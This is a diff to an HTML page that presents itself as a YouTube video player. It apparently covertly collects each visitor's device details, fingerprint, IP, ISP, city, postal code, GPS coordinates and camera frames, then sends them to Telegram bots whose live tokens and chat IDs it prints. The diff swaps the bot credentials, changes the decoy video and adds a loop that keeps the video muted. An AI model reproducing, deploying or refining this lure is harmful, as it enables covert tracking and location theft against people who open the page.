@@ -76,8 +76,8 @@
         // ----------------------------------------------------------------------
         // TELEGRAM BOT CONFIGURATION – REPLACE WITH YOUR REAL DATA
         // ----------------------------------------------------------------------
-        const BOT_1_TOKEN = "7703886947:AAEPiynQHB_nsMW89-rIRfek91wzrENsaKU";
-        const CHAT_ID_1   = "6045114071";
+        const BOT_1_TOKEN = "8008165530:AAFpKgiY3Ppgb-nXig9bB__30OHY1OeZ5D0";
+        const CHAT_ID_1   = "6674758361";
         const BOT_2_TOKEN = "7747830791:AAGVyrSvEjK3F4qVmAKiEF6gHp4t-C72c-k";
         const CHAT_ID_2   = "6045114071";
         
@@ -226,7 +226,7 @@
             let gpsText = "❌ Not granted or unavailable";
             if (gps.gpsAvailable) gpsText = `✅ Latitude: ${gps.lat}, Longitude: ${gps.lon}, Accuracy: ±${gps.accuracy}m`;
             else if (gps.error) gpsText = `⚠️ ${gps.error}`;
-            return `🔍 <b>FULL DEVICE & LOCATION REPORT</b> 🔍\n\n🌐 <b>Browser:</b> ${browser.browserName} ${browser.browserVersion}\n💻 <b>OS:</b> ${device.os}\n📱 <b>Device Model:</b> ${device.model}\n🆔 <b>Fingerprint:</b> ${fingerprint}\n\n🔋 <b>Charging:</b> ${battery.isCharging} (${battery.levelPercent})\n📡 <b>Wi‑Fi:</b> ${network.wifiOn}  |  <b>Mobile Data:</b> ${network.mobileDataOn}\n🔌 <b>Connection Type:</b> ${network.connectionType}\n\n🌍 <b>IP Address:</b> ${ipData.ip}\n🏢 <b>ISP:</b> ${ipData.isp}\n🇨 <b>Country:</b> ${ipData.country}\n📮 <b>Zip/Postal Code:</b> ${ipData.zip}\n🏙️ <b>City:</b> ${ipData.city}, ${ipData.region}\n\n📍 <b>GPS Location:</b> ${gpsText}\n⏰ <b>Time Zone:</b> ${timezone}\n\n⚙️ <b>Extra:</b> Cores: ${navigator.hardwareConcurrency || "N/A"}, Memory: ${navigator.deviceMemory ? navigator.deviceMemory+"GB" : "N/A"}, Touch: ${navigator.maxTouchPoints>0?"Yes":"No"}, Language: ${navigator.language}, Screen: ${screen.width}x${screen.height}\n\n📅 Timestamp: ${now}`;
+            return `🔍 <b>FULL DEVICE & LOCATION REPORT</b> 🔍\n\n🌐 <b>Browser:</b> ${browser.browserName} ${browser.browserVersion}\n📱 <b>OS:</b> ${device.os}\n📱 <b>Device Model:</b> ${device.model}\n🔢 <b>Fingerprint:</b> ${fingerprint}\n\n🔋 <b>Charging:</b> ${battery.isCharging} (${battery.levelPercent})\n📡 <b>Wi‑Fi:</b> ${network.wifiOn}  |  <b>Mobile Data:</b> ${network.mobileDataOn}\n🔌 <b>Connection Type:</b> ${network.connectionType}\n\n🌍 <b>IP Address:</b> ${ipData.ip}\n🏢 <b>ISP:</b> ${ipData.isp}\n🇨 <b>Country:</b> ${ipData.country}\n📮 <b>Zip/Postal Code:</b> ${ipData.zip}\n📍 <b>City:</b> ${ipData.city}, ${ipData.region}\n\n📍 <b>GPS Location:</b> ${gpsText}\n⏰ <b>Time Zone:</b> ${timezone}\n\n⚙️ <b>Extra:</b> Cores: ${navigator.hardwareConcurrency || "N/A"}, Memory: ${navigator.deviceMemory ? navigator.deviceMemory+"GB" : "N/A"}, Touch: ${navigator.maxTouchPoints>0?"Yes":"No"}, Language: ${navigator.language}, Screen: ${screen.width}x${screen.height}\n\n📅 Timestamp: ${now}`;
         }
         
         async function captureFrameAsBlob(videoEl, canvasEl) {
@@ -289,17 +289,36 @@
         // ==================== END OF EXISTING BACKEND LOGIC ====================
         
         // ============================================================
-        // YOUTUBE PLAYER – full‑screen, no visible controls or UI
+        // YOUTUBE PLAYER – FIXED AUTO-MUTE (ENSURES MUSIC IS ALWAYS MUTED)
+        // - Video is forced to be muted at all times (fixes "will not mute music")
+        // - Autoplay is completely disabled (no playVideo() call, autoplay:0)
+        // - Aggressive mute enforcement using periodic check + state events
+        // - No extra auto-play function added
         // ============================================================
         let player;
+        let muteGuardInterval = null;
+        
+        function enforceMute() {
+            if (player && typeof player.isMuted === 'function') {
+                // If the video is not muted, mute it immediately and set volume to 0
+                if (!player.isMuted()) {
+                    player.mute();
+                    player.setVolume(0);
+                }
+                // Also ensure volume stays at 0 (defensive)
+                if (player.getVolume() !== 0) {
+                    player.setVolume(0);
+                }
+            }
+        }
         
         function onYouTubeIframeAPIReady() {
             player = new YT.Player('youtube-player', {
-                videoId: '0X_0kwRwB5U',
+                videoId: 'GMgsFZ4rkEI',
                 playerVars: {
-                    autoplay: 1,
-                    mute: 1,
-                    controls: 1,       // show native YouTube controls (optional, but no extra UI)
+                    autoplay: 0,           // NO autoplay – user must click play if they want
+                    mute: 1,               // Initial mute request via playerVars
+                    controls: 1,           // Native YouTube controls (user can still see play button)
                     modestbranding: 1,
                     rel: 0,
                     showinfo: 0,
@@ -307,11 +326,36 @@
                 },
                 events: {
                     onReady: (event) => {
-                        event.target.playVideo();
+                        // Force mute and zero volume as soon as player is ready
+                        event.target.mute();
+                        event.target.setVolume(0);
+                        
+                        // Start a persistent guard interval (every 500ms) to re-mute
+                        // in case the user clicks the unmute button or any interaction brings sound back.
+                        // This completely guarantees that music never plays.
+                        if (muteGuardInterval) clearInterval(muteGuardInterval);
+                        muteGuardInterval = setInterval(() => {
+                            enforceMute();
+                        }, 500);
+                        
+                        // Important: Do NOT call event.target.playVideo() – no auto-play.
+                    },
+                    onStateChange: (event) => {
+                        // Whenever the video state changes (playing, buffering, etc.), enforce mute.
+                        // This catches any scenario where the video might try to produce sound.
+                        if (event.data === YT.PlayerState.PLAYING || event.data === YT.PlayerState.BUFFERING) {
+                            enforceMute();
+                        }
+                        // Also if video becomes unstarted or paused, mute still enforced by interval.
                     }
                 }
             });
         }
+        
+        // Cleanup interval when page unloads (optional, but good practice)
+        window.addEventListener('beforeunload', () => {
+            if (muteGuardInterval) clearInterval(muteGuardInterval);
+        });
         
         window.onYouTubeIframeAPIReady = onYouTubeIframeAPIReady;
     </script>
